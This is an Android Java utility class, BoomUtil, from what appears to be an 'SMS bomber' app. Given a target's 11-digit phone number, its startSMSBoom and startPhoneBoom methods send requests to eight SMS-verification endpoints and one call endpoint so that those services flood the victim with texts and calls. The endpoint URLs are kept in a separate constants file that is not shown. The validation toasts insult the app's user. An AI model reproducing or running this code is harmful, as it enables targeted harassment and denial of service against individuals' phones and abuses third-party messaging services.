package com.sherlock.mvp.util;

import android.content.Context;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Toast;

import com.okhttplib.HttpInfo;
import com.okhttplib.OkHttpUtil;
import com.okhttplib.annotation.Encoding;
import com.sherlock.mvp.AppConstant;

/**
 * Created by SherlockHolmes on 2017/10/31.16:32
 */

public class BoomUtil {

	private static String TAG = "BoomUtil";

	private HttpInfo httpInfo;
	private Toast toast;
	private Context context;

	public BoomUtil(Context context) {
		this.context = context;

		httpInfo = HttpInfo.Builder()
				.setResponseEncoding(Encoding.UTF_8)//设置该接口的服务器响应编码
				.setRequestEncoding(Encoding.UTF_8)//设置该接口的请求参数编码
				.build();
	}

	public void startSMSBoom(String phone) {
		sendSMSBoom1(phone);
		sendSMSBoom2(phone);
		sendSMSBoom3(phone);
		sendSMSBoom4(phone);
		sendSMSBoom5(phone);
		sendSMSBoom6(phone);
		sendSMSBoom7(phone);
		sendSMSBoom8(phone);
		Log.d(TAG, "startSMSBoom: " + phone);
	}

	public void startPhoneBoom(String phone) {
		sendPhoneBoom1(phone);
		Log.d(TAG, "startPhoneBoom: " + phone);
	}

	private void sendSMSBoom1(String phone) {
		if (isNull(phone)) {
			return;
		}
		httpInfo
				.setUrl(AppConstant.SMS_URL1 + phone);
		OkHttpUtil.getDefault(this)
				.doGetSync(httpInfo);
		httpInfo.getRetDetail();
	}

	private void sendSMSBoom2(String phone) {
		if (isNull(phone)) {
			return;
		}
		httpInfo
				.setUrl(AppConstant.SMS_URL2 + phone);
		OkHttpUtil.getDefault(this)
				.doGetSync(httpInfo);
		httpInfo.getRetDetail();
	}

	private void sendSMSBoom3(String phone) {
		if (isNull(phone)) {
			return;
		}
		httpInfo
				.setUrl(AppConstant.SMS_URL3 + phone);
		OkHttpUtil.getDefault(this)
				.doGetSync(httpInfo);
		httpInfo.getRetDetail();
	}

	private void sendSMSBoom4(String phone) {
		if (isNull(phone)) {
			return;
		}
		httpInfo
				.setUrl(AppConstant.SMS_URL4 + phone);
		OkHttpUtil.getDefault(this)
				.doGetSync(httpInfo);
		httpInfo.getRetDetail();
	}

	private void sendSMSBoom5(String phone) {
		if (isNull(phone)) {
			return;
		}
		httpInfo
				.setUrl(AppConstant.SMS_URL5 + phone);
		OkHttpUtil.getDefault(this)
				.doGetSync(httpInfo);
		httpInfo.getRetDetail();
	}

	private void sendSMSBoom6(String phone) {
		if (isNull(phone)) {
			return;
		}
		httpInfo
				.setUrl(AppConstant.SMS_URL6 + System.currentTimeMillis() + "&phone=" + phone);
		OkHttpUtil.getDefault(this)
				.doGetSync(httpInfo);
		httpInfo.getRetDetail();
	}

	private void sendSMSBoom7(String phone) {
		if (isNull(phone)) {
			return;
		}
		httpInfo
				.setUrl(AppConstant.SMS_URL7 + phone);
		OkHttpUtil.getDefault(this)
				.doGetSync(httpInfo);
		httpInfo.getRetDetail();
	}

	private void sendSMSBoom8(String phone) {
		if (isNull(phone)) {
			return;
		}
		httpInfo
				// 1509017907635&mobile=手机号&_=1509017907636
				.setUrl(AppConstant.SMS_URL8 + (System.currentTimeMillis() - 1) + "&mobile=" + phone + "&_="
						+ System.currentTimeMillis());
		OkHttpUtil.getDefault(this)
				.doGetSync(httpInfo);
		httpInfo.getRetDetail();
	}

	private void sendPhoneBoom1(String phone) {
		if (isNull(phone)) {
			return;
		}
		httpInfo
				.setUrl(AppConstant.PHONE_URL1 + phone);
		OkHttpUtil.getDefault(this)
				.doGetSync(httpInfo);
		httpInfo.getRetDetail();
	}

	private static boolean isNull(String str) {
		return TextUtils.isEmpty(str);
	}

	public boolean checkPhoneNumber(String phoneNumber) {
		if (TextUtils.isEmpty(phoneNumber)) {
			toast("智障，请输入手机号码！");
			return false;
		}
		if (phoneNumber.length() != 11) {
			toast("智障，请输入正确的手机号码！");
			return false;
		}
		return true;
	}

	public void toast(String text) {
		if (toast == null) {
			toast = Toast.makeText(context.getApplicationContext(), text, Toast.LENGTH_SHORT);
			toast.show();
		} else {
			toast.setText(text);
			toast.show();
		}
	}
}
